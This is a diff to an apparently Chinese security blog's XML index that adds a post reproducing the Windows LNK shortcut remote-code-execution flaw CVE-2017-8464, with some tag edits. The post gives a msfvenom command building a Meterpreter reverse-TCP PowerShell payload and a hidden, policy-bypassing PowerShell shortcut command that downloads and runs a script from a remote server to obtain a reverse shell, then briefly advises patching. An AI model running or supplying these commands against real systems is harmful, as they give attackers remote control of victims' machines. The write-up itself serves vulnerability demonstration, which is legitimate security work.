@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title><![CDATA[Windows快捷方式远程代码执行]]></title>
+      <url>http://isron.cn/2017/06/16/CVE-2017-8464/</url>
+      <content type="html"><![CDATA[<p>早在2010微软就曾爆出一个lnk快捷方式的远程代码执行漏洞(ms10-046)，时隔七年，它又来了，zzzz<a id="more"></a></p>
+<h2 id="漏洞等级"><a href="#漏洞等级" class="headerlink" title="漏洞等级"></a>漏洞等级</h2><p>严重</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Windows 10<br>Windows 7<br>Windows 8.1<br>Windows RT 8.1<br>Windows Server 2008<br>Windows Server 2008 R2<br>Windows Server 2012<br>Windows Server 2012 R2<br>Windows Server 2016</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里我选择我在公网上的vps作为利用环境，首先用<code>msfvenom</code>生成一个反弹shell的木马<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">msfvenom</span>  -p   windows/x64/meterpreter/<span class="keyword">reverse_tcp </span> lhost=公网<span class="built_in">ip</span> lport<span class="number">=8889</span>  -f  psh-reflection &gt; Isron.ps1</div></pre></td></tr></table></figure></p>
+<p><img src="https://ooo.0o0.ooo/2017/06/16/5943467e7792c.jpg" alt=""><br>然后将生成文件放到我的网站根目录下<br><img src="https://ooo.0o0.ooo/2017/06/16/5943473c2f0ee.jpg" alt=""><br>之后创建一个恶意的快捷方式<br><figure class="highlight scilab"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powershell -windowstyle hidden -<span class="built_in">exec</span> bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('</span>http:<span class="comment">//ip/Isron.ps1');test.ps1"</span></div></pre></td></tr></table></figure></p>
+<p><img src="https://ooo.0o0.ooo/2017/06/16/59434a9eccf29.jpg" alt=""><br><img src="https://ooo.0o0.ooo/2017/06/16/59434ac964341.jpg" alt=""><br>在vps上开启msf进行监听<br><img src="https://ooo.0o0.ooo/2017/06/16/59434b2437704.jpg" alt=""><br>运行我们的恶意快捷方式就得到了反弹的shell<br><img src="https://ooo.0o0.ooo/2017/06/16/59434b78699fd.jpg" alt=""></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>尽快升级安装微软补丁，<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464" target="_blank" rel="external">链接</a></p>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> CVE </tag>
+            
+            <tag> Windows </tag>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[MSF生成木马后门]]></title>
       <url>http://isron.cn/2017/06/15/msf_backdoor/</url>
       <content type="html"><![CDATA[<p>在玩msf的时候发现很多人会利用反弹shell的payload去生成一个小木马，网上教程也很多了，就不再过多赘述了，=.=<a id="more"></a></p>
@@ -41,6 +66,8 @@
         
         <tags>
             
+            <tag> CVE </tag>
+            
             <tag> CMS </tag>
             
             <tag> PHP </tag>
@@ -62,6 +89,8 @@
       
         
         <tags>
+            
+            <tag> CVE </tag>
             
             <tag> Linux </tag>
             
@@ -180,9 +209,9 @@
         
         <tags>
             
-            <tag> CTF </tag>
-            
             <tag> 命令执行 </tag>
+            
+            <tag> CTF </tag>
             
             <tag> Linux </tag>
             
@@ -269,9 +298,11 @@
         
         <tags>
             
-            <tag> Web安全 </tag>
+            <tag> CVE </tag>
             
             <tag> 命令执行 </tag>
+            
+            <tag> Web安全 </tag>
             
         </tags>
         
